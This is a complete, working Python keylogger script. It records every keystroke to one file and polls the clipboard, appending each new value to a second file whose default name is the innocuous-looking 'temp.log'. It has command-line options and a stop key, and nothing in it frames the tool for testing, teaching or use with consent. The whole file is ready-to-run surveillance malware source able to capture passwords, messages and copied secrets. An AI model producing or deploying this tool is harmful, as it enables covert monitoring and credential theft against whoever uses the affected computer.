"""
keylogger.py — Captures keystrokes + clipboard in parallel, saving to separate files.

Usage:
    python keylogger.py [--output keylog.txt] [--clip-output temp.log] [--stop-key F9]

Controls:
    • Press the stop key (default: F9) to stop both threads and exit.
    • Ctrl+C in the terminal also stops everything cleanly.

Requirements:
    pip install pynput pyperclip
"""

import argparse
import datetime
import signal
import sys
import threading
import time
from pathlib import Path

import pyperclip
from pynput import keyboard

# ── CLI arguments ──────────────────────────────────────────────────────────────

parser = argparse.ArgumentParser(description="Keystroke + clipboard logger")
parser.add_argument(
    "--output", "-o",
    default="keylog.txt",
    help="File for keystroke log (default: keylog.txt)",
)
parser.add_argument(
    "--clip-output", "-c",
    default="temp.log",
    help="File for clipboard log (default: temp.log)",
)
parser.add_argument(
    "--stop-key", "-s",
    default="f9",
    help="Key name that stops the logger (default: f9)",
)
parser.add_argument(
    "--clip-interval", "-i",
    type=float,
    default=5.0,
    help="Clipboard poll interval in seconds (default: 5)",
)
args = parser.parse_args()

OUTPUT_FILE      = Path(args.output)
CLIP_OUTPUT_FILE = Path(args.clip_output)
STOP_KEY_NAME    = args.stop_key.lower()
CLIP_INTERVAL    = args.clip_interval

# ── Shared stop event ──────────────────────────────────────────────────────────

stop_event = threading.Event()   # set() → both threads shut down

# ── Keystroke helpers ──────────────────────────────────────────────────────────

def resolve_stop_key(name: str):
    try:
        return keyboard.Key[name]
    except KeyError:
        if len(name) == 1:
            return keyboard.KeyCode.from_char(name)
        print(f"[ERROR] Unknown stop key: '{name}'. "
              "Use a pynput Key name (f9, esc, …) or a single character.")
        sys.exit(1)

STOP_KEY = resolve_stop_key(STOP_KEY_NAME)

def format_key(key) -> str:
    try:
        return key.char if key.char is not None else f"[{key}]"
    except AttributeError:
        name = str(key).replace("Key.", "")
        special = {
            "space": " ", "enter": "\n", "tab": "\t",
            "backspace": "[BACKSPACE]", "caps_lock": "[CAPS_LOCK]",
            "shift": "[SHIFT]",     "shift_r": "[SHIFT]",
            "ctrl_l": "[CTRL]",     "ctrl_r": "[CTRL]",
            "alt_l": "[ALT]",       "alt_r": "[ALT]",
            "cmd": "[CMD]",         "delete": "[DELETE]",
            "home": "[HOME]",       "end": "[END]",
            "page_up": "[PAGE_UP]", "page_down": "[PAGE_DOWN]",
            "up": "[UP]",           "down": "[DOWN]",
            "left": "[LEFT]",       "right": "[RIGHT]",
            "esc": "[ESC]",
            "f1": "[F1]",  "f2": "[F2]",  "f3": "[F3]",  "f4": "[F4]",
            "f5": "[F5]",  "f6": "[F6]",  "f7": "[F7]",  "f8": "[F8]",
            "f9": "[F9]",  "f10": "[F10]","f11": "[F11]","f12": "[F12]",
        }
        return special.get(name, f"[{name.upper()}]")

# ── Keystroke thread ───────────────────────────────────────────────────────────

def run_keylogger():
    log_file = OUTPUT_FILE.open("a", encoding="utf-8")
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_file.write(f"--- Recording started at {ts} ---\n")
    log_file.flush()

    def write(text: str):
        log_file.write(text)
        log_file.flush()

    def on_press(key):
        if key == STOP_KEY:
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            write(f"\n\n--- Recording stopped at {ts} ---\n")
            log_file.close()
            print(f"\n[keylog] Stop key pressed. Saved to '{OUTPUT_FILE}'.")
            stop_event.set()      # signal clipboard thread to stop too
            return False          # stop the pynput listener

        write(format_key(key))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    # If we reach here because stop_event was set externally (Ctrl+C handler),
    # make sure the file is closed.
    if not log_file.closed:
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_file.write(f"\n\n--- Recording interrupted at {ts} ---\n")
        log_file.close()

# ── Clipboard monitor thread ───────────────────────────────────────────────────

def run_clipboard_monitor():
    clip_file = CLIP_OUTPUT_FILE.open("a", encoding="utf-8")
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clip_file.write(f"--- Clipboard monitor started at {ts} ---\n")
    clip_file.flush()

    last_value = None

    # Seed with whatever is already on the clipboard (skip logging it)
    try:
        last_value = pyperclip.paste()
    except Exception:
        pass

    while not stop_event.is_set():
        # Sleep in small increments so we react to stop_event quickly
        for _ in range(int(CLIP_INTERVAL * 10)):
            if stop_event.is_set():
                break
            time.sleep(0.1)

        if stop_event.is_set():
            break

        try:
            current = pyperclip.paste()
        except Exception as exc:
            print(f"[clipboard] Warning: could not read clipboard — {exc}")
            continue

        if current and current != last_value:
            ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            entry = f"[{ts}]\n{current}\n{'-' * 40}\n"
            clip_file.write(entry)
            clip_file.flush()
            print(f"[clipboard] New entry captured ({len(current)} chars)")
            last_value = current

    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    clip_file.write(f"--- Clipboard monitor stopped at {ts} ---\n")
    clip_file.close()
    print(f"[clipboard] Saved to '{CLIP_OUTPUT_FILE}'.")

# ── Entry point ────────────────────────────────────────────────────────────────

def main():
    print("[INFO] Starting keystroke logger + clipboard monitor.")
    print(f"       Keystrokes : {OUTPUT_FILE.resolve()}")
    print(f"       Clipboard  : {CLIP_OUTPUT_FILE.resolve()}  (poll every {CLIP_INTERVAL}s)")
    print(f"       Stop       : press {STOP_KEY_NAME.upper()} or Ctrl+C\n")

    # Ctrl+C handler — set stop_event; the keyboard listener will also be stopped
    def handle_sigint(sig, frame):
        print("\n[INFO] Ctrl+C received — stopping…")
        stop_event.set()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    # Clipboard thread — daemon so it dies if main thread crashes
    clip_thread = threading.Thread(target=run_clipboard_monitor, daemon=True)
    clip_thread.start()

    # Keystroke listener runs on the main thread (required on macOS)
    run_keylogger()

    # Wait for clipboard thread to finish writing before exit
    clip_thread.join(timeout=CLIP_INTERVAL + 1)

if __name__ == "__main__":
    main()